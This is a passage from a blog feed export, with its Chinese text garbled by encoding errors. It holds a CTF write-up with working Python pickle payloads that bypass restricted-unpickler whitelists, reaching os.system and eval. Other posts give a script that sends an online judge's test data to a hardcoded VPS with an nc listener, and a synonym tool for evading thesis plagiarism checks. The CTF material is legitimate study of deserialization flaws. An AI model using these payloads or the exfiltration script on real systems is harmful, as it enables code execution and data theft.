sys&gt;&gt;&gt; sys.modules[&#39;sys&#39;]=sys.modules&gt;&gt;&gt; import sys&gt;&gt;&gt; dir(sys)[&#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;fromkeys&#39;, &#39;get&#39;, &#39;items&#39;, &#39;keys&#39;, &#39;pop&#39;, &#39;popitem&#39;, &#39;setdefault&#39;, &#39;update&#39;, &#39;values&#39;]</code></pre><p>ç„¶åsyså°±è¢«æ›¿æ¢æˆsys.modulesäº†,å°±å¯ä»¥æ‹¿åˆ°osäº†</p><p>ç„¶åå†å¯¹sys.modules[â€˜sysâ€™]å†èµ‹å€¼ä¸ºos</p><p>å°±å¯ä»¥import osäº†</p><p>(å¸ˆå‚…ä»¬tql)</p><p>æ„é€ payload</p><pre><code>csysmodulesS&#39;sys&#39;csysmodulesp100scsysget(S&#39;os&#39;tRp101g100S&#39;sys&#39;g101scsyssystem(S&#39;dir&#39;tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><pre><code class="python">#!/usr/bin/python3 -uimport securePickle as pickleimport codecspickle.whitelist.append(&#39;structs&#39;)class Pysh(object):    def __init__(self):        self.login()        self.cmds = {            &#39;help&#39;: self.cmd_help,            &#39;flag&#39;: self.cmd_flag,        }    def login(self):        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()    def cmd_help(self):        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))    def cmd_su(self):        print(&quot;Not Implemented QAQ&quot;)        # self.user.privileged = 1    def cmd_flag(self):        print(&quot;Not Implemented QAQ&quot;)if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><p>è¿™æ¬¡æ›´éªšäº†ç›´æ¥ç»™äº†ä¸ªç©ºæ¨¡å—</p><pre><code class="shell">&gt;&gt;&gt; dir(structs)[&#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre><p><code>__spec__,__loader__,__builtins__</code>æ˜¯æˆ‘ä»¬éœ€è¦æ³¨æ„çš„</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹æ“ä½œç c(çœ‹é‡è½½åçš„find_classä»£ç ,çœ‹åˆ«äººwpçš„æ—¶å€™æ²¡çœ‹é‡è½½åçš„find_class,ç„¶åè¿wpéƒ½çœ‹ä¸æ‡‚äº†)çš„å®ç°,å‘ç°è°ƒç”¨äº†<code>__import__</code></p><p>åœ¨æ–‡æ¡£ä¸­å‘ç°</p><blockquote><p>æ­¤å‡½æ•°(<code>__import__</code>)ä¼šç”± <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> è¯­å¥å‘èµ·è°ƒç”¨ã€‚ å®ƒå¯ä»¥è¢«æ›¿æ¢ (é€šè¿‡å¯¼å…¥ <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> æ¨¡å—å¹¶èµ‹å€¼ç»™ <code>builtins.__import__</code>) ä»¥ä¾¿ä¿®æ”¹ <code>import</code> è¯­å¥çš„è¯­ä¹‰ </p></blockquote><p>è€Œ<code>__buiutins__</code>é‡Œé¢ä¹Ÿæœ‰<code>__import__</code></p><pre><code>&gt;&gt;&gt; structs.__builtins__[&#39;__import__&#39;]=eval&gt;&gt;&gt; import osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: eval expected at most 3 arguments, got 5&gt;&gt;&gt; __import__(&#39;print(123)&#39;)123</code></pre><p>æˆåŠŸä¿®æ”¹äº†<code>__import__</code></p><p>æˆ‘ä»¬å†çœ‹é‡è½½çš„find_class</p><p>securePickle.py</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        module = __import__(module)        return getattr(module, name)#ä¸€èˆ¬é‡è½½éƒ½ä¼šæ”¹æˆif xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)</code></pre><p>è€ŒåŸæ¥çš„find_classæ˜¯è¿™æ ·çš„</p><pre><code class="python">def find_class:    __import__(module, level=0)    return getattr(sys.modules[module], name)</code></pre><p>æ¥ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡æ“ä½œç cæ¥å®ç°ä¸€ä¸‹æ“ä½œ</p><pre><code class="python">return getattr(__import__(module), name)</code></pre><p>å¦‚æœèƒ½ä»¤<code>__import__(module)</code>çš„è¿”å›å€¼ä¸º<code>__builtins__</code>æ—¶,å°±å¯ä»¥å–å‡º<code>__builtins__</code>é‡Œçš„å€¼</p><p>ç»“åˆ<a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1" target="_blank" rel="noopener">é­”æœ¯æ–¹æ³•</a><code>__getattribute__</code>ä¾¿å¯ä»¥å®ç°</p><p>äºæ˜¯æ„é€ </p><pre><code class="python">bis=structs.__builtins__structs.__setattr__(&#39;structs&#39;,bis)#nameåªèƒ½ä¸ºstructsbis[&#39;__import__&#39;]=structs.__getattribute__getattr(__import__(&quot;structs&quot;),&quot;get&quot;)(&quot;eval&quot;)(&quot;print(123)&quot;)</code></pre><p>å¯¹åº”çš„pickleä»£ç </p><pre><code>cstructs__builtins__p1000cstructs__setattr__(S&#39;structs&#39;g100tRg100S&#39;__import__&#39;cstructs__getattribute__scstructsget(S&quot;eval&quot;tR(S&#39;print(123)&#39;tR.</code></pre><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p><pre><code class="python">class User(object):    def __init__(self, name, group):        self.name = name        self.group = group        self.isadmin = 0        self.prompt = &#39;&#39;</code></pre><pre><code class="python">import pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        return pickle.Unpickler.find_class(self, module, name)def loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps</code></pre><p>server.py</p><pre><code class="python">import securePickle as pickleimport codecsimport ospickle.whitelist.append(&#39;structs&#39;)class Pysh(object):    def __init__(self):        self.key = os.urandom(100)        self.login()        self.cmds = {            &#39;help&#39;: self.cmd_help,            &#39;whoami&#39;: self.cmd_whoami,            &#39;su&#39;: self.cmd_su,            &#39;flag&#39;: self.cmd_flag,        }    def login(self):        with open(&#39;../flag.txt&#39;, &#39;rb&#39;) as f:            flag = f.read()        flag = bytes(a ^ b for a, b in zip(self.key, flag))        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)        user.privileged = False        user.flag = flag        self.user = user    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()    def cmd_help(self):        print(&#39;Available commands: &#39; + &#39; &#39;.join(self.cmds.keys()))    def cmd_whoami(self):        print(self.user.name, self.user.group)    def cmd_su(self):        print(&quot;Not Implemented QAQ&quot;)        # self.user.privileged = 1    def cmd_flag(self):        if not self.user.privileged:            print(&#39;flag: Permission denied&#39;)        else:            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><p>å¦‚æœæˆ‘ä»¬æƒ³æ‹¿åˆ°flag,è¦ä¹ˆå‘½ä»¤æ‰§è¡Œç›´æ¥æ‹¿flagè¦ä¹ˆå°±ä»¤<code>user.privileged=True</code> è°ƒç”¨cmd_flagæ¥æ‹¿flag</p><p>ä½†æ˜¯å†ååºåˆ—åŒ–å¤„</p><pre><code class="python">        user = pickle.loads(user)        print(&#39;Login as &#39; + user.name + &#39; - &#39; + user.group)        user.privileged = False</code></pre><p><code>user.privileged</code>ä¼šè¢«è¦†ç›–ä¸ºFalse,å†åº·åº·å…¶ä»–çš„ä¿¡æ¯æŠŠ</p><p><code>dir(structs)</code>:</p><pre><code class="python">[&#39;User&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;]</code></pre><hr><p>å‡ ä¸ªå°æ—¶å,çœ‹wpå­¦æˆå½’æ¥.</p><p>æˆ‘:è‰¹,å¤ªéªšäº†,å¸ˆå‚…ä»¬ç‰›é€¼æ­»äº†</p><hr><p>ä¹‹å‰è¯´æœ‰ä¸¤ä¸ªè§£é¢˜æ€è·¯,å‘½ä»¤æ‰§è¡Œè¿™ä¸€ä¸ªæ€è·¯åœ¨çœ‹äº†ä¸€ä¼šä¹‹åå°±è§‰å¾—ä¸å¤ªè¡Œ,æ¯«æ— å¤´ç»ª</p><p>å†åº·åº·è®©<code>user.privileged=False</code>å¤±æ•ˆè¿™ä¸€æ€è·¯,emmmmæ„Ÿè§‰ä¹Ÿä¸å¤ªè¡Œ.</p><p>ä½†æ˜¯,ç±»çš„èµ‹å€¼è‚¯å®šä¼šå—åˆ°ä¸€äº›ç‰¹æ®Šå‡½æ•°çš„å½±å“</p><p>åœ¨ç ”ç©¶ç±»çš„èµ‹å€¼çš„æ—¶å€™å¯ä»¥æ‰¾åˆ°<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">æè¿°ç¬¦</a>å¯ä»¥è‡ªå®šä¹‰èµ‹å€¼å‡½æ•°</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½è®©Userçš„<code>__set__</code>å˜æˆä¸€ä¸ªæ¥å—3ä¸ªå‚æ•°çš„å‡½æ•°,å°±å¯ä»¥ä»¤<code>user.privileged=False</code>æ— æ•ˆ</p><p>ä½†æ˜¯å¾ˆæ˜¾ç„¶pickleé‡Œæ˜¯æ— æ³•ç›´æ¥ç¼–å†™ä»£ç çš„,ä»¤<code>__set__=&quot;&quot;</code>?æ›´ä¸è¡Œ,ä¼šç›´æ¥æŠ¥é”™</p><p>ç»§ç»­é˜…è¯»ä»£ç æˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿</p><pre><code class="python">class User(object):    def __init__(self, name, group):        self.name = name        self.group = group        self.isadmin = 0        self.prompt = &#39;&#39;        print(&quot;name:%s ,group:%s&quot;%(name,group))</code></pre><p><code>User.__init__</code>åˆšå¥½æ¥å—ä¸‰ä¸ªå‚æ•°</p><p>æˆ‘ä»¬èƒ½ä¸èƒ½è®©<code>__set__=User</code>?,ç„¶åè°ƒç”¨<code>__set__</code>çš„æ—¶å€™è°ƒç”¨<code>User.__init__</code></p><pre><code class="python">&gt;&gt;&gt; setattr(User,&#39;test&#39;,User(123,123))name:123 ,group:123&gt;&gt;&gt; setattr(User,&quot;__set__&quot;,User)&gt;&gt;&gt; b=User(123,123)name:123 ,group:123&gt;&gt;&gt; b.test=123123name:&lt;structs.User object at 0x0000017BA1538748&gt; ,group:123123</code></pre><p>äºæ˜¯æ„é€ :</p><pre><code class="python">a=__import__(&quot;structs&quot;).Userb=User(&quot;123&quot;,&quot;456&quot;)setattr(a,&quot;privileged&quot;,b)setattr(a,&quot;__set__&quot;,a)return b</code></pre><p>å¯¹åº”çš„pickleä»£ç ä¸º</p><pre><code>cstructsUserp100(S&quot;123&quot;S&quot;456&quot;tRp101g100(N}S&#39;privileged&#39;g101sS&#39;__set__&#39;g100stbg101.</code></pre><pre><code>$ helpAvailable commands: help whoami su flag$ whoami123 456$ flagb&#39;Balsn{pY7h0n1dae_ObJ3c7}\n&#39;</code></pre><p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><p> <a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p><p> <a href="https://xz.aliyun.com/t/5306" target="_blank" rel="noopener">https://xz.aliyun.com/t/5306</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/12/16/pickle/">http://blog.ccreater.top/2019/12/16/pickle/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡</title>
      <link href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/"/>
      <url>/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡"><a href="#å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡" class="headerlink" title="å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡"></a>å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡</h1><pre><code class="python">import sysif len(sys.argv) !=2:    print(&quot;Usage: %s inputfile outputfile&quot; % sys.argv[0])    exit()import synonymsf=sys.argv[1]s=&quot;&quot;with open(f,&quot;r&quot;) as fl:    s=fl.read()resstr,stype=synonyms.seg(s)with open(sys.argv[2],&quot;w&quot;) as fw:    for i in resstr:        if len(i)==1:            fw.write(i)        else :            nearbystr,num=synonyms.nearby(i)            if len(nearbystr)&gt;1 and num[1]&gt; 0.75:                print(nearbystr[1],num[1])                fw.write(nearbystr[1])            else :                fw.write(i)</code></pre><p>å¯ä»¥è°ƒæ•´<code>if len(nearbystr)&gt;1 and num[1]&gt; 0.75:</code>æ¥ä¿®æ”¹è¿‘ä¹‰è¯çš„å‡†ç¡®ç‡.</p><p>ç”¨å®Œä¹‹åä¸€å®šè¦è‡ªå·±æ ¡å¯¹ä¸€é!!!ä¸ç„¶â€¦..</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/12/15/å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡/">http://blog.ccreater.top/2019/12/15/å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨çº¿ojè·å–æ•°æ®</title>
      <link href="/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>/2019/12/15/%E5%9C%A8%E7%BA%BFoj%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="åœ¨çº¿ojè·å–æ•°æ®"><a href="#åœ¨çº¿ojè·å–æ•°æ®" class="headerlink" title="åœ¨çº¿ojè·å–æ•°æ®"></a>åœ¨çº¿ojè·å–æ•°æ®</h1><p>python3:</p><pre><code class="python">import socketimport sys    ip = &#39;39.108.164.219&#39;port = 60000def send_raw(raw):    try:        with socket.create_connection((ip, port), timeout=10) as conn:            conn.send(bytes(raw,encoding=&quot;ascii&quot;))            conn.close()    except:        return False      return Truedata=&quot;&quot;for line in sys.stdin:    data+=linesend_raw(data)</code></pre><p>vpsä¸Šè¿è¡Œ</p><pre><code class="shell">#!/bin/bashi=1while [ $i -eq 1 ]do      nc -FNlp 60000  &gt;&gt; /tmp/data    echo -e  &quot;\n---------------------------------\n&quot; &gt;&gt; /tmp/datadone</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/12/15/åœ¨çº¿ojè·å–æ•°æ®/">http://blog.ccreater.top/2019/12/15/åœ¨çº¿ojè·å–æ•°æ®/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨</title>
      <link href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/"/>
      <url>/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨"><a href="#ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨" class="headerlink" title="ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨"></a>ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨</h1><h2 id="ä»¤äººç–‘æƒ‘çš„ç»“æœ"><a href="#ä»¤äººç–‘æƒ‘çš„ç»“æœ" class="headerlink" title="ä»¤äººç–‘æƒ‘çš„ç»“æœ"></a>ä»¤äººç–‘æƒ‘çš„ç»“æœ</h2><p>æ¥çœ‹ä¸€ä¸ªä»£ç å§</p><pre><code class="c++">#include&lt;stdio.h&gt;int i=0;int update(){i++;return i;}int main(){    printf(&quot;update():%d i:%d\n&quot;,update(),i);    return 0;}</code></pre><p>ä½ è§‰å¾—å®ƒçš„è¾“å‡ºç»“æœæ˜¯ä»€ä¹ˆ<br><del>update():1 i:1</del> ?<br><strong>é”™</strong>ï¼Œæ­£ç¡®è¾“å‡ºæ˜¯<code>update():1 i:0</code></p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>ä¸ºä½•ä¼šå¦‚æ­¤,å…ˆæ¥åšä¸ªå®éªŒåº·åº·å§:</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    printf(&quot;----------------------------test printf----------------------------\n&quot;);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;update():%d i:%d\n&quot;,update(),i);    printf(&quot;later:%d\n&quot;,i);    printf(&quot;before:%d\n&quot;,i);    printf(&quot;i:%d update():%d \n&quot;,i,update());    printf(&quot;later:%d\n&quot;,i);    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());}</code></pre><p>å®ƒçš„è¾“å‡ºç»“æœæ˜¯</p><pre><code>----------------------------test printf----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><p>åªæœ‰printfæ˜¯è¿™æ ·çš„?ä¸ï¼Œå¯å˜å‚æ•°çš„æ‰“å°å‡½æ•°éƒ½å…·æœ‰è¿™æ ·çš„ç‰¹æ€§<br>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹coutæ¥éªŒè¯ä¸€ä¸‹</p><pre><code class="c++">#include&lt;iostream&gt;#include &lt;queue&gt;#include&lt;stdio.h&gt; using namespace std;int i=0;int update(){i++;return i;};int main(){    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;    i=0;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;}</code></pre><p>å®ƒçš„è¾“å‡ºç»“æœæ˜¯:</p><pre><code>---------------------------- test cout ----------------------------before:0update():1 i:0later:1before:1i:2 update():2later:2update1:5 update2:4 update3:3</code></pre><h2 id="æ±‡ç¼–å±‚é¢çš„è§£é‡Š"><a href="#æ±‡ç¼–å±‚é¢çš„è§£é‡Š" class="headerlink" title="æ±‡ç¼–å±‚é¢çš„è§£é‡Š"></a>æ±‡ç¼–å±‚é¢çš„è§£é‡Š</h2><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·,è¿™å°±å¿…é¡»è¯´èµ·cå’Œc++ä¸­å…³äºå‡½æ•°ä¼ å‚çš„è¿‡ç¨‹äº†:</p><p>åœ¨æ±‡ç¼–ä¸­å‡½æ•°ä¼ å‚è¦ä»æœ€åä¸€ä¸ªå‚æ•°åˆ°ç¬¬ä¸€ä¸ªå‚æ•°åˆ†åˆ«å…¥æ ˆï¼Œè¿™æ ·å‡½æ•°å–å‚æ•°çš„æ—¶å€™ï¼Œpopå‡ºæ¥çš„é¡ºåºæ‰æ˜¯1-nã€‚</p><p>å› æ­¤,åœ¨<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>ä¸­,å‡½æ•°å…ˆå‹å…¥i,å†æ‰§è¡Œupdate(),å°†å…¶è¿”å›å€¼å‹å…¥æ ˆã€‚</p><p>ä»¥ä¸Šåªæ˜¯ç†è®ºï¼ŒçœŸå®çš„ç¯å¢ƒä¸­ç”±x86,x64,32ä½,16ä½æœº,å®ƒä»¬çš„å…·ä½“çš„ä¼ å‚æ–¹å¼ç•¥æœ‰ä¸åŒ:)  </p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹x64ä¸‹è¿™ä¸€æ¡è¯­å¥çš„æ±‡ç¼–ä»£ç </p><pre><code>mov     ebx, cs:icall    _Z6updatev      ; update(void)mov     r8d, ebxmov     edx, eaxlea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>åœ¨X64ä¸‹,æ˜¯å¯„å­˜å™¨ä¼ å‚. å‰4ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ rcx rdx r8 r9è¿›è¡Œä¼ å‚.å¤šä½™çš„é€šè¿‡æ ˆä¼ å‚.ä»å³å‘å·¦å…¥æ ˆã€‚</p><p>ä¸Šè¿°ä»£ç ä¸­ æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨rcxä¸­(æœ€åä¸€ä¸ªèµ‹å€¼),update()è¿”å›å€¼åœ¨edx,ä¸­ç¬¬äºŒä¸ªèµ‹å€¼ã€‚iåœ¨r8ä¸­ç¬¬ä¸€ä¸ªèµ‹å€¼ ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>mov     ebx, cs:i</code>ç¨‹åºå…ˆå°†içš„å€¼ç§»åŠ¨åˆ°ebxä¸­ï¼Œå†è°ƒç”¨updateå‡½æ•°,å°†è¿”å›å€¼æ‰€åœ¨å¯„å­˜å™¨eaxç§»åŠ¨åˆ°edxä¸­ã€‚</p><p>è™½ç„¶è¿‡ç¨‹æœ‰ç‚¹å˜åŒ–,ä½†æ˜¯æœ€åçš„ç»“æœè¿˜æ˜¯å’Œåœ¨æ±‡ç¼–ä¸­å‡½æ•°ä¼ å‚è¦ä»æœ€åä¸€ä¸ªå‚æ•°åˆ°ç¬¬ä¸€ä¸ªå‚æ•°åˆ†åˆ«å…¥æ ˆã€‚</p><h2 id="æ¥ç»ƒä¹ ä¸€ä¸‹å§"><a href="#æ¥ç»ƒä¹ ä¸€ä¸‹å§" class="headerlink" title="æ¥ç»ƒä¹ ä¸€ä¸‹å§"></a>æ¥ç»ƒä¹ ä¸€ä¸‹å§</h2><p>æœ€åä¸Šä¸€ä¸ªé¢˜ç›®å§//</p><pre><code class="c++">#include &lt;stdio.h&gt;int main(){    long long a = 1, b = 2, c = 3;    printf(&quot;%d %d %d\n&quot;, a,b,c);    return 0;}</code></pre><p>æ±‚è¾“å‡º</p><p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">ç­”æ¡ˆå’Œè§£æ</a></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/12/14/ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨/">http://blog.ccreater.top/2019/12/14/ç”±coutå’Œprintfæ¥å¯¹å‡½æ•°ä¼ å‚è¿‡ç¨‹çš„æ¢è®¨/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="/2019/12/14/hello-world/"/>
      <url>/2019/12/14/hello-world/</url>
      
